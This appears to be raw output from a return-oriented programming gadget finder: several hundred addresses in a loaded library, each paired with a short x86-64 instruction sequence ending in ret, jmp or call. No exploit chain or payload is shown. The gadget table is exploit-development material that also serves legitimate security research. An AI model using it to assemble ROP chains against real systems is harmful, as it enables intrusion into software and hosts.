0x00002aaaaabd9056 : add byte ptr [rax], al ; add cl, ch ; ret 0xf771
0x00002aaaaab35226 : add byte ptr [rax], al ; add cl, ch ; ret 0xffb8
0x00002aaaaab3c732 : add byte ptr [rax], al ; add cl, ch ; ret 0xffbf
0x00002aaaaab72c35 : add byte ptr [rax], al ; add cl, ch ; ret 0xffd3
0x00002aaaaab72b01 : add byte ptr [rax], al ; add cl, ch ; ret 0xfff5
0x00002aaaaab000af : add byte ptr [rax], al ; add cl, ch ; ret 0xfffb
0x00002aaaaabc5051 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffd
0x00002aaaaab3584f : add byte ptr [rax], al ; add cl, ch ; ret 0xffff
0x00002aaaaac54675 : add byte ptr [rax], al ; add dh, bh ; xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00002aaaaaaeef2d : add byte ptr [rax], al ; add dh, bl ; ret
0x00002aaaaaaeef15 : add byte ptr [rax], al ; add dh, cl ; ret
0x00002aaaaaaeef45 : add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaaaf8ff4 : add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x00002aaaaabb8a07 : add byte ptr [rax], al ; add dh, dh ; ret 0x7408
0x00002aaaaabb8a16 : add byte ptr [rax], al ; add dh, dh ; ret 0x7420
0x00002aaaaac461b1 : add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x00002aaaaab36ba2 : add byte ptr [rax], al ; add dh, dh ; ret 0x7504
0x00002aaaaab75700 : add byte ptr [rax], al ; add dh, dh ; ret 0xf20
0x00002aaaaab75709 : add byte ptr [rax], al ; add dh, dh ; ret 0xf40
0x00002aaaaabb8ac9 : add byte ptr [rax], al ; add dword ptr [rbp - 0x7cb7febd], ecx ; ret
0x00002aaaaabaa03f : add byte ptr [rax], al ; add dword ptr [rbx + 4], 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac1059e : add byte ptr [rax], al ; add dword ptr [rdi + 0x28], 4 ; mov eax, 1 ; ret
0x00002aaaaac1055e : add byte ptr [rax], al ; add dword ptr [rdi + 0x28], edx ; mov eax, 1 ; ret
0x00002aaaaaba9fb6 : add byte ptr [rax], al ; add dword ptr [rdi], ecx ; lahf ; ret 0x82eb
0x00002aaaaac8359a : add byte ptr [rax], al ; add dword ptr ss:[rax], eax ; nop ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84e9a : add byte ptr [rax], al ; add qword ptr fs:[r8], r8 ; mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab8039e : add byte ptr [rax], al ; add rax, 3 ; ret
0x00002aaaaab2e820 : add byte ptr [rax], al ; add rax, rcx ; jmp rax
0x00002aaaaab62d44 : add byte ptr [rax], al ; add rax, rdi ; add rax, rcx ; ret
0x00002aaaaab22a4e : add byte ptr [rax], al ; add rax, rsi ; jmp rax
0x00002aaaaac07201 : add byte ptr [rax], al ; add rdi, 0x10 ; jmp rcx
0x00002aaaaac09c81 : add byte ptr [rax], al ; add rdi, 0x58 ; jmp rcx
0x00002aaaaac093e1 : add byte ptr [rax], al ; add rdi, 0x68 ; jmp rcx
0x00002aaaaac06664 : add byte ptr [rax], al ; add rdi, 0xc8 ; jmp rcx
0x00002aaaaac08432 : add byte ptr [rax], al ; add rsi, 0x38 ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab1d0d6 : add byte ptr [rax], al ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac02f65 : add byte ptr [rax], al ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac1874e : add byte ptr [rax], al ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0a9da : add byte ptr [rax], al ; add rsp, 0x108 ; ret
0x00002aaaaab0a3a8 : add byte ptr [rax], al ; add rsp, 0x148 ; ret
0x00002aaaaabf45bd : add byte ptr [rax], al ; add rsp, 0x18 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f331 : add byte ptr [rax], al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabca3a9 : add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x00002aaaaac0f33e : add byte ptr [rax], al ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab5d00d : add byte ptr [rax], al ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf5b8b : add byte ptr [rax], al ; add rsp, 0x28 ; jmp rax
0x00002aaaaab4fbac : add byte ptr [rax], al ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab09b20 : add byte ptr [rax], al ; add rsp, 0x28 ; ret
0x00002aaaaac03c2d : add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x00002aaaaabcb554 : add byte ptr [rax], al ; add rsp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0b965 : add byte ptr [rax], al ; add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf59ac : add byte ptr [rax], al ; add rsp, 0x98 ; ret
0x00002aaaaab0a697 : add byte ptr [rax], al ; add rsp, 0xd0 ; ret
0x00002aaaaab1acf1 : add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaab61caa : add byte ptr [rax], al ; add rsp, 8 ; jmp rax
0x00002aaaaab4538a : add byte ptr [rax], al ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab43405 : add byte ptr [rax], al ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab4077b : add byte ptr [rax], al ; add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab731ca : add byte ptr [rax], al ; add rsp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x00002aaaaab692e1 : add byte ptr [rax], al ; add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f1cd : add byte ptr [rax], al ; add rsp, 8 ; mov rax, rsi ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf6aa7 : add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4e155 : add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; sub rax, rdx ; ret
0x00002aaaaab0a178 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaab5f8f6 : add byte ptr [rax], al ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac82e5a : add byte ptr [rax], al ; and al, 0x2f ; add dword ptr [rax], eax ; jo 0x1ade4a ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac83d5a : add byte ptr [rax], al ; and al, 0x3e ; add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74e5a : add byte ptr [rax], al ; and al, 0x4f ; add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe6c
0x00002aaaaac6b6f6 : add byte ptr [rax], al ; and al, 0x50 ; jmp 0x196700
0x00002aaaaac6c11e : add byte ptr [rax], al ; and al, 0x6e ; out dx, al ; call rsp
0x00002aaaaac8705a : add byte ptr [rax], al ; and al, 0x71 ; add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac77c5a : add byte ptr [rax], al ; and al, 0x7d ; add byte ptr [rax], al ; nop ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac7965a : add byte ptr [rax], al ; and al, 0x97 ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac79a5a : add byte ptr [rax], al ; and al, 0x9b ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaac6bc0e : add byte ptr [rax], al ; and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaac7f49f : add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac9340e : add byte ptr [rax], al ; and al, 4 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaabfae88 : add byte ptr [rax], al ; and byte ptr [rax], al ; jmp 0x125e55
0x00002aaaaac7688e : add byte ptr [rax], al ; and byte ptr [rcx], al ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac7bd4e : add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac7a87e : add byte ptr [rax], al ; and byte ptr [rdi - 0x12], cl ; call qword ptr [rdx]
0x00002aaaaac81f9a : add byte ptr [rax], al ; and byte ptr fs:[rcx], al ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab4ceee : add byte ptr [rax], al ; and dword ptr [rdi], 0xffffffcf ; ret
0x00002aaaaac7d86e : add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaab030eb : add byte ptr [rax], al ; and eax, esi ; ret
0x00002aaaaac43e73 : add byte ptr [rax], al ; and ecx, 0xff ; sub eax, ecx ; ret
0x00002aaaaac435a6 : add byte ptr [rax], al ; and ecx, 0xffff ; sub eax, ecx ; ret
0x00002aaaaab62f7e : add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x00002aaaaab62f8e : add byte ptr [rax], al ; bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab62f9e : add byte ptr [rax], al ; bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab6ab5e : add byte ptr [rax], al ; bsf eax, eax ; lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab5fbf0 : add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00002aaaaab7352e : add byte ptr [rax], al ; bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab7353e : add byte ptr [rax], al ; bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab7354e : add byte ptr [rax], al ; bsr eax, eax ; lea rax, qword ptr [rax + rdi + 0x30] ; ret
0x00002aaaaab618a4 : add byte ptr [rax], al ; bsr rax, rax ; add rax, rdi ; ret
0x00002aaaaab61932 : add byte ptr [rax], al ; bsr rsi, rsi ; lea rax, qword ptr [rdi + rsi] ; ret
0x00002aaaaac70066 : add byte ptr [rax], al ; call 0x111998ca
0x00002aaaaac7bb86 : add byte ptr [rax], al ; call 0x111a686b
0x00002aaaaab5d26c : add byte ptr [rax], al ; call 0x114494
0x00002aaaaac78a16 : add byte ptr [rax], al ; call 0x121a27a1
0x00002aaaaac71d86 : add byte ptr [rax], al ; call 0x1319b6e3
0x00002aaaaac73196 : add byte ptr [rax], al ; call 0x1319cb66
0x00002aaaaac71e36 : add byte ptr [rax], al ; call 0x1819b799
0x00002aaaaab9d381 : add byte ptr [rax], al ; call 0x1f8ab
0x00002aaaaac7f486 : add byte ptr [rax], al ; call 0x221a96b5
0x00002aaaaac7c156 : add byte ptr [rax], al ; call 0x281a6b8b
0x00002aaaaaaf6956 : add byte ptr [rax], al ; call 0x2dc44
0x00002aaaaab13cff : add byte ptr [rax], al ; call 0x2dc4a
0x00002aaaaaafb689 : add byte ptr [rax], al ; call 0x2dc4b
0x00002aaaaac073af : add byte ptr [rax], al ; call 0x2e624
0x00002aaaaabe12d8 : add byte ptr [rax], al ; call 0x356f9
0x00002aaaaabd2690 : add byte ptr [rax], al ; call 0x7659a
0x00002aaaaac4954e : add byte ptr [rax], al ; call qword ptr [rbx]
0x00002aaaaaade3a6 : add byte ptr [rax], al ; call qword ptr [rsi]
0x00002aaaaab9065d : add byte ptr [rax], al ; call r12
0x00002aaaaaaf5850 : add byte ptr [rax], al ; call rax
0x00002aaaaabd7aa9 : add byte ptr [rax], al ; call rbx
0x00002aaaaac17dfe : add byte ptr [rax], al ; call rcx
0x00002aaaaac5467e : add byte ptr [rax], al ; call rdi
0x00002aaaaab0efcc : add byte ptr [rax], al ; call rdx
0x00002aaaaac5382e : add byte ptr [rax], al ; call rsp
0x00002aaaaac5a516 : add byte ptr [rax], al ; clc ; loope 0x18551f ; jmp qword ptr [rdi]
0x00002aaaaac5a596 : add byte ptr [rax], al ; clc ; loope 0x18559f ; jmp qword ptr [rdi]
0x00002aaaaac5a616 : add byte ptr [rax], al ; clc ; loope 0x18561f ; jmp qword ptr [rdi]
0x00002aaaaac72996 : add byte ptr [rax], al ; clc ; mov cl, ch ; jmp rsp
0x00002aaaaac730b6 : add byte ptr [rax], al ; clc ; ret
0x00002aaaaac7f1c6 : add byte ptr [rax], al ; clc ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaac81232 : add byte ptr [rax], al ; cld ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac755aa : add byte ptr [rax], al ; cld ; add byte ptr [rax], al ; add al, dh ; mov bl, 0xec ; jmp qword ptr [rcx]
0x00002aaaaac84d32 : add byte ptr [rax], al ; cld ; add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84c32 : add byte ptr [rax], al ; cld ; add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84a32 : add byte ptr [rax], al ; cld ; add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85032 : add byte ptr [rax], al ; cld ; push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85332 : add byte ptr [rax], al ; cld ; push rbx ; add dword ptr [rax], eax ; js 0x1b03b9 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac73dee : add byte ptr [rax], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaac7f49a : add byte ptr [rax], al ; cmc ; add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7f482 : add byte ptr [rax], al ; cmc ; add byte ptr [rax], al ; call 0x221a96b9
0x00002aaaaabcfc99 : add byte ptr [rax], al ; cmova eax, edx ; ret
0x00002aaaaabdcec9 : add byte ptr [rax], al ; cmovae rax, rsi ; ret
0x00002aaaaab8a93d : add byte ptr [rax], al ; cmove eax, edx ; ret
0x00002aaaaabab05f : add byte ptr [rax], al ; cmove eax, esi ; ret
0x00002aaaaabd20a7 : add byte ptr [rax], al ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaaba03cc : add byte ptr [rax], al ; cmove rax, rdx ; ret
0x00002aaaaab9f252 : add byte ptr [rax], al ; cmovle eax, ebx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe9c19 : add byte ptr [rax], al ; cmovne eax, edx ; ret
0x00002aaaaab6b8d8 : add byte ptr [rax], al ; cmovne rax, rdi ; ret
0x00002aaaaac14c63 : add byte ptr [rax], al ; cmovne rax, rdx ; add rsp, 8 ; ret
0x00002aaaaaba1dfd : add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00002aaaaabe311f : add byte ptr [rax], al ; cmovns rax, qword ptr [rbx + 0x28] ; pop rbx ; ret
0x00002aaaaac82e72 : add byte ptr [rax], al ; cmp al, 0x2f ; add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac84972 : add byte ptr [rax], al ; cmp al, 0x4a ; add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac84f72 : add byte ptr [rax], al ; cmp al, 0x50 ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac87072 : add byte ptr [rax], al ; cmp al, 0x71 ; add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7d072 : add byte ptr [rax], al ; cmp al, 0xd1 ; add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaaadaea6 : add byte ptr [rax], al ; cmp al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac41016 : add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac7c646 : add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaac7f606 : add byte ptr [rax], al ; cmp byte ptr [rdx], ch ; jmp qword ptr [rdi]
0x00002aaaaac07bce : add byte ptr [rax], al ; cmp dword ptr [rsi + 0x10], 0xc ; je 0x132bea ; xor eax, eax ; ret
0x00002aaaaabe9f7e : add byte ptr [rax], al ; cmp eax, 0xff ; jne 0x114f81 ; xor eax, eax ; leave ; ret
0x00002aaaaab49697 : add byte ptr [rax], al ; cmp eax, 0xff ; jne 0x746a8 ; pop rbx ; ret
0x00002aaaaaba0b40 : add byte ptr [rax], al ; cmp eax, 0xfffff001 ; jae 0xcbb53 ; ret
0x00002aaaaac91602 : add byte ptr [rax], al ; cmp eax, dword ptr [rip + 0x1e70000] ; add byte ptr [rax], al ; ret 4
0x00002aaaaab81067 : add byte ptr [rax], al ; cmp edi, 0x7f ; ja 0xac081 ; mov eax, edi ; ret
0x00002aaaaaba1646 : add byte ptr [rax], al ; cmp edx, 0 ; mov eax, edx ; jle 0xcc662 ; ret
0x00002aaaaab0f9fe : add byte ptr [rax], al ; cmp edx, 0xff ; cmovne rax, rbx ; pop rbx ; ret
0x00002aaaaab47aa5 : add byte ptr [rax], al ; cmp qword ptr [rax + 0x30], 0 ; je 0x72ab9 ; ret
0x00002aaaaabd51c1 : add byte ptr [rax], al ; cmp rax, rcx ; cmovne rbx, rax ; call 0xfc3eb
0x00002aaaaab5cb8a : add byte ptr [rax], al ; cmp rax, rdx ; jne 0x87b4a ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac73bd6 : add byte ptr [rax], al ; cmp rbp, rdx ; call qword ptr [rbx]
0x00002aaaaab583d7 : add byte ptr [rax], al ; cmp rdx, r8 ; jne 0x833a8 ; ret
0x00002aaaaaba1ee4 : add byte ptr [rax], al ; cmp rdx, rcx ; jne 0xccf17 ; ret
0x00002aaaaac76cb6 : add byte ptr [rax], al ; cwde ; adc ebp, ebp ; call rsi
0x00002aaaaac7c436 : add byte ptr [rax], al ; cwde ; cmp al, 0xf0 ; jmp qword ptr [rbx]
0x00002aaaaac77a26 : add byte ptr [rax], al ; enter -0x12bd, -1 ; and eax, 0x4000001 ; ret 0x18f
0x00002aaaaac7d782 : add byte ptr [rax], al ; fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac84112 : add byte ptr [rax], al ; fadd qword ptr [rcx + 1] ; add al, ch ; sub ch, dh ; jmp qword ptr [rbx]
0x00002aaaaac87012 : add byte ptr [rax], al ; fdiv qword ptr [rax + 1] ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7b012 : add byte ptr [rax], al ; fdiv qword ptr [rax - 0x4e780000] ; out dx, al ; call qword ptr [rax]
0x00002aaaaac7d076 : add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaac78846 : add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaac83912 : add byte ptr [rax], al ; fdivr qword ptr [rcx] ; add dword ptr [rax], eax ; sbb byte ptr [rbx], al ; cmc ; call qword ptr [rdi]
0x00002aaaaac83d12 : add byte ptr [rax], al ; fdivr qword ptr [rip + 0x1e380001] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7f512 : add byte ptr [rax], al ; fdivr st(5), st(0) ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac84f12 : add byte ptr [rax], al ; fmul qword ptr [rdi + 1] ; add byte ptr [rax], ch ; jo 0x1aff19 ; jmp qword ptr [rcx]
0x00002aaaaac74f12 : add byte ptr [rax], al ; fmul qword ptr [rdi] ; add byte ptr [rax + 0x5f], cl ; jmp 0x19ff24
0x00002aaaaac78a12 : add byte ptr [rax], al ; fmul qword ptr [rdx + 0x7fe80000] ; in eax, dx ; call qword ptr [rcx]
0x00002aaaaab0a0d6 : add byte ptr [rax], al ; fstp st(1) ; ret
0x00002aaaaac8472a : add byte ptr [rax], al ; hlt ; add dword ptr [r8], r8d ; loopne 0x1af78e ; cmc ; call qword ptr [rdx]
0x00002aaaaac82e2a : add byte ptr [rax], al ; hlt ; add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac8362a : add byte ptr [rax], al ; hlt ; add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84f2a : add byte ptr [rax], al ; hlt ; add qword ptr [r8], r8 ; jo 0x1aff31 ; jmp qword ptr [rcx]
0x00002aaaaac7f52a : add byte ptr [rax], al ; hlt ; cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83d2a : add byte ptr [rax], al ; hlt ; cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6c2ae : add byte ptr [rax], al ; hlt ; fldz ; call rsp
0x00002aaaaac8702a : add byte ptr [rax], al ; hlt ; jo 0x1b2039 ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7ac2a : add byte ptr [rax], al ; hlt ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c2a ; jmp qword ptr [rcx]
0x00002aaaaac8ef1a : add byte ptr [rax], al ; in al, -0x11 ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac7ca1a : add byte ptr [rax], al ; in al, -0x36 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac7ba1a : add byte ptr [rax], al ; in al, -0x46 ; add byte ptr [rax], al ; sal byte ptr [rbp - 0x11], 1 ; jmp qword ptr [rax]
0x00002aaaaac81122 : add byte ptr [rax], al ; in al, dx ; adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac84e22 : add byte ptr [rax], al ; in al, dx ; add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac86f22 : add byte ptr [rax], al ; in al, dx ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac78f22 : add byte ptr [rax], al ; in al, dx ; pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac85622 : add byte ptr [rax], al ; in al, dx ; push rsi ; add dword ptr [rax], eax ; js 0x1b06ae ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac71c22 : add byte ptr [rax], al ; in al, dx ; sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac8fd22 : add byte ptr [rax], al ; in al, dx ; std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac7ab22 : add byte ptr [rax], al ; in al, dx ; stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac811a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; adc al, byte ptr [rcx] ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac837a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; cmp byte ptr [rcx], al ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac789a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; mov al, byte ptr [rax] ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac8e5a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; out 1, al ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaac8a8a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; test eax, 0xe2080001 ; sti ; call rsi
0x00002aaaaac831a2 : add byte ptr [rax], al ; insb byte ptr [rdi], dx ; xor al, byte ptr [rcx] ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac84bef : add byte ptr [rax], al ; insd dword ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7de46 : add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaac9097e : add byte ptr [rax], al ; int1 ; or byte ptr [rbx], al ; ret
0x00002aaaaabed4a5 : add byte ptr [rax], al ; ja 0x1184bc ; mov rax, rdi ; sar rax, 6 ; ret
0x00002aaaaabcacf6 : add byte ptr [rax], al ; jbe 0xf5d05 ; ret
0x00002aaaaabe0da9 : add byte ptr [rax], al ; je 0x10bdc2 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabea67c : add byte ptr [rax], al ; je 0x115692 ; lea rax, qword ptr [rip + 0x37c19] ; ret
0x00002aaaaabea76c : add byte ptr [rax], al ; je 0x115782 ; lea rax, qword ptr [rip + 0x37ec9] ; ret
0x00002aaaaabeb15a : add byte ptr [rax], al ; je 0x116172 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaabec65a : add byte ptr [rax], al ; je 0x117672 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaac6b8de : add byte ptr [rax], al ; je 0x196944 ; in eax, dx ; jmp rsp
0x00002aaaaac7a2aa : add byte ptr [rax], al ; je 0x1a525a ; add byte ptr [rax], al ; nop ; in al, -4 ; call qword ptr [rdx]
0x00002aaaaac7adaa : add byte ptr [rax], al ; je 0x1a5d65 ; add byte ptr [rax], al ; loopne 0x1a5d43 ; out dx, al ; jmp rbx
0x00002aaaaac7c1de : add byte ptr [rax], al ; je 0x1a71e9 ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaac7caaa : add byte ptr [rax], al ; je 0x1a7a82 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac822aa : add byte ptr [rax], al ; je 0x1ad2da ; add dword ptr [rax], eax ; loopne 0x1ad255 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833aa : add byte ptr [rax], al ; je 0x1ae3eb ; add dword ptr [rax], eax ; push rax ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84daa : add byte ptr [rax], al ; je 0x1afe05 ; add dword ptr [rax], eax ; nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850aa : add byte ptr [rax], al ; je 0x1b0108 ; add dword ptr [rax], eax ; push rax ; jb 0x1b00b1 ; jmp qword ptr [rcx]
0x00002aaaaac857aa : add byte ptr [rax], al ; je 0x1b080f ; add dword ptr [rax], eax ; jo 0x1b0740 ; cmc ; jmp rax
0x00002aaaaac9051f : add byte ptr [rax], al ; je 0x1bb51f ; call qword ptr [rdi]
0x00002aaaaab4282c : add byte ptr [rax], al ; je 0x6d83f ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab42b91 : add byte ptr [rax], al ; je 0x6dbd3 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab430d6 : add byte ptr [rax], al ; je 0x6e104 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab43e73 : add byte ptr [rax], al ; je 0x6ee93 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44776 : add byte ptr [rax], al ; je 0x6f7a5 ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44dc1 : add byte ptr [rax], al ; je 0x6fdd8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab454f5 : add byte ptr [rax], al ; je 0x70507 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45677 : add byte ptr [rax], al ; je 0x70687 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45831 : add byte ptr [rax], al ; je 0x70876 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45a74 : add byte ptr [rax], al ; je 0x70a8a ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45feb : add byte ptr [rax], al ; je 0x71000 ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab4618e : add byte ptr [rax], al ; je 0x711a7 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46325 : add byte ptr [rax], al ; je 0x71337 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4ab83 : add byte ptr [rax], al ; je 0x75b97 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4af88 : add byte ptr [rax], al ; je 0x75f97 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0ac : add byte ptr [rax], al ; je 0x760bf ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b1ee : add byte ptr [rax], al ; je 0x76207 ; mov eax, esi ; pop rbx ; ret
